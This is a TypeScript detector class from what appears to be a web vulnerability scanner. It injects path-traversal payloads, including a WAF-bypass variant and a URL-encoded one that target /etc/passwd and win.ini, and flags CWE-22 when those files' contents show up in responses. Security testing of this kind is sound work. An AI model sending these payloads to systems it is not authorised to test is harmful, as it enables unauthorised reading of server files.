import { IActiveDetector, ActiveDetectorContext } from '../../core/interfaces/IActiveDetector';
import { Vulnerability } from '../../types/vulnerability';
import { VulnerabilitySeverity, VulnerabilityCategory } from '../../types/enums';
import { AttackSurface, AttackSurfaceType } from '../../scanners/active/DomExplorer';
import { PayloadInjector, InjectionResult, PayloadEncoding } from '../../scanners/active/PayloadInjector';
import { getOWASP2025Category } from '../../utils/cwe/owasp-2025-mapping';

/**
 * Path Traversal Detector
 * Covers: Path Traversal (LFI), IDOR (basic)
 * OWASP A01:2021-Broken Access Control / A01:2025-Broken Access Control
 */
export class PathTraversalDetector implements IActiveDetector {
  readonly name = 'Path Traversal Detector';
  readonly description = 'Detects Path Traversal and File Inclusion vulnerabilities';
  readonly version = '1.0.0';

  private injector: PayloadInjector;

  constructor() {
    this.injector = new PayloadInjector();
  }

  async detect(context: ActiveDetectorContext): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    const { page, attackSurfaces, baseUrl } = context;

    this.injector.setSafeMode(context.safeMode ?? false);

    // Target only inputs that might deal with files or paths
    // Or generic inputs if we are aggressive
    const targets = attackSurfaces.filter(
      (s) => 
        [AttackSurfaceType.URL_PARAMETER, AttackSurfaceType.API_PARAM].includes(s.type) ||
        (s.type === AttackSurfaceType.FORM_INPUT && (s.name.includes('file') || s.name.includes('path') || s.name.includes('doc')))
    );

    for (const surface of targets) {
      const vuln = await this.testPathTraversal(page, surface, baseUrl);
      if (vuln) vulnerabilities.push(vuln);
    }

    return vulnerabilities;
  }

  private async testPathTraversal(page: any, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const payloads = [
      '../../../../etc/passwd',
      '..\\..\\..\\..\\windows\\win.ini',
      '/etc/passwd',
      'C:\\Windows\\win.ini',
      '....//....//....//etc/passwd', // WAF bypass
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL Encoded
    ];

    for (const payload of payloads) {
      try {
        const result = await this.injector.inject(page, surface, payload, {
          encoding: PayloadEncoding.NONE,
          submit: true,
          baseUrl
        });

        const body = result.response?.body || '';
        
        if (
          body.includes('root:x:0:0') || 
          body.includes('[extensions]') || 
          body.includes('16-bit app support')
        ) {
          const cwe = 'CWE-22';
          const owasp = getOWASP2025Category(cwe) || 'A01:2021';

          return {
            id: `path-traversal-${Date.now()}`,
            title: 'Path Traversal / LFI',
            description: `Path traversal detected in ${surface.type} '${surface.name}'`,
            severity: VulnerabilitySeverity.HIGH,
            category: VulnerabilityCategory.AUTHORIZATION, // Closest mapping to Broken Access Control
            cwe,
            owasp,
            url: result.response?.url || baseUrl,
            evidence: {
              request: { body: payload },
              response: { body: body.substring(0, 500) }
            },
            remediation: 'Validate user input against a whitelist of permitted values. Use filesystem APIs that do not allow path traversal characters (..).',
            references: ['https://owasp.org/www-community/attacks/Path_Traversal'],
            timestamp: new Date()
          };
        }
      } catch (e) {
        // ignore
      }
    }
    return null;
  }

  async validate(): Promise<boolean> {
    return true;
  }

  getPatterns(): RegExp[] {
    return [];
  }

  async analyzeInjectionResult(_result: InjectionResult): Promise<Vulnerability[]> {
    return [];
  }

  getPayloads(): string[] {
    return [
      '../../../../etc/passwd',
      '/etc/passwd'
    ];
  }
}
